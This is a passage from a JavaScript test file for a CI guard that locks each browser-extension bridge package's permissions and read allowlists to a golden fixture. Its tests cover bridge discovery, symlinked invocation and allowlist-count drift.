  // ---------- the bridge list comes from disk ----------

  it("discovers every packages/*-bridge directory", () => {
    const discovered = discoverBridges(REPO);

    assert.ok(discovered.length >= 5, discovered.join(", "));
    for (const bridge of [
      "garmin-bridge",
      "tanita-bridge",
      "train2go-bridge",
      "trainingpeaks-bridge",
      "whoop-bridge",
    ]) {
      assert.ok(discovered.includes(bridge), `missing ${bridge}`);
    }
  });

  it("fails when a new bridge package ships without a golden entry", () => {
    // The list used to be a hardcoded array, so `packages/foo-bridge` could
    // reach production with its permissions and its read allowlist locked by
    // nothing at all, and CI stayed green.
    withTempRepo(
      {
        "packages/acme-bridge/manifest.json": JSON.stringify({
          permissions: ["cookies"],
        }),
        "scripts/fixtures/bridge-privacy-surface.json": "{}",
      },
      (result) => {
        assert.equal(result.status, 1, result.stdout);
        assert.match(result.stderr, /drifted from golden/);
        assert.match(result.stderr, /acme-bridge/);
      }
    );
  });

  // ---------- the script must actually run when invoked ----------

  it("runs its checks when invoked through a symlinked path", () => {
    // `import.meta.url === pathToFileURL(process.argv[1]).href` is false
    // under a symlinked invocation path, because Node resolves module URLs
    // to the real path but leaves argv[1] as typed. main() never ran and the
    // guard exited 0 having verified nothing. macOS `/tmp` is itself a
    // symlink to `/private/tmp`, so mkdtemp here reproduces it directly.
    const dir = mkdtempSync(join(tmpdir(), "kaiord-surface-symlink-"));
    try {
      const link = join(dir, "repo");
      symlinkSync(REPO, link);
      const result = spawnSync("node", [join(link, "scripts", SCRIPT_NAME)], {
        encoding: "utf8",
      });

      assert.equal(result.status, 0, result.stderr);
      assert.match(
        result.stdout,
        /matches golden/,
        "guard produced no output — it exited without checking anything"
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("fixture allowed_paths count matches each bridge's source allowlist count", () => {
    // Mechanical drift catcher: if a future PR adds an allowlist entry but
    // forgets the golden, this assertion fires before the guard's
    // run-comparison even gets to surface the diff.
    //
    // The count is derived WITHOUT the guard's extractor. Calling
    // `extractPatternAllowlist` here made this test share the extractor's
    // pairing assumption, so a key-order swap that made entries disappear
    // from the golden made them disappear from this count too — and the
    // test written precisely to catch a missing entry agreed with the lie.
    // Counting key occurrences rests on nothing but "one `method:` and one
    // `pattern:` per entry", which the extractor does not get to define.
    const golden = JSON.parse(readFileSync(GOLDEN, "utf8"));
    for (const bridge of Object.keys(golden)) {
      // Content-script bridges keep the allowlist in content.js; SW-direct
      // bridges (garmin, train2go, tanita, trainingpeaks) keep it in
      // background.js. Cross-count against whichever the guard reads.
      const contentPath = join(REPO, "packages", bridge, "content.js");
      const backgroundPath = join(REPO, "packages", bridge, "background.js");
      const sourcePath = existsSync(contentPath) ? contentPath : backgroundPath;
      if (!existsSync(sourcePath)) {
        // Bridges without any allowlist source declare an empty allowlist in
        // the golden; nothing to cross-count.
        assert.deepEqual(golden[bridge].allowed_paths, []);
        continue;
      }
      const src = readFileSync(sourcePath, "utf8");

      const patternStart = src.indexOf("const ALLOWED = [");
      const prefixStart = src.indexOf("const ALLOWED_PREFIXES = [");
      assert.ok(
        patternStart >= 0 || prefixStart >= 0,
        `${bridge}: ${sourcePath} declares neither ALLOWED nor ALLOWED_PREFIXES`
      );

      const start = patternStart >= 0 ? patternStart : prefixStart;
      const end = src.indexOf("];", start);
      assert.ok(
        end >= 0,
        `${bridge}: allowlist array has no closing "];" — array was probably truncated`
      );
      // Whole-line comments only: the patterns never contain two adjacent
      // slashes, so no regex can be mistaken for a comment here.
      const body = src.slice(start, end + 2).replace(/^[ \t]*\/\/.*$/gm, "");

      const sourceCount =
        patternStart >= 0
          ? countKeyedEntries(bridge, body)
          : countQuotedPrefixLines(body);

      const fixtureCount = golden[bridge].allowed_paths.length;
      assert.ok(
        sourceCount > 0,
        `${bridge}: counted 0 allowlist entries in ${sourcePath} — the counter does not understand this declaration's shape, so this assertion would pass vacuously`
      );
      assert.equal(
        fixtureCount,
        sourceCount,
        `${bridge}: fixture has ${fixtureCount} allowed_paths but the source allowlist has ${sourceCount} entries`
      );
    }
  });

  it("records whoop's GET-only prefix allowlist, matching content.js exactly", () => {
    const golden = JSON.parse(readFileSync(GOLDEN, "utf8"));
    const entries = golden["whoop-bridge"].allowed_paths;
    assert.ok(entries.length > 0, "whoop allowed_paths must not be empty");
    // Every whoop read is gated to GET by isAllowed(); the golden records
    // that, and records `prefix` (not `pattern`) so swapping the matching
    // semantics is itself visible drift.
    for (const e of entries) {
      assert.equal(e.method, "GET");
      assert.ok(typeof e.prefix === "string" && e.prefix.startsWith("/"));
      assert.equal(e.pattern, undefined);
    }
    const src = readFileSync(WHOOP_CONTENT, "utf8");
    for (const e of entries) {
      assert.ok(
        src.includes(`"${e.prefix}"`),
        `golden lists ${e.prefix} but content.js does not declare it`
      );
    }
  });
});
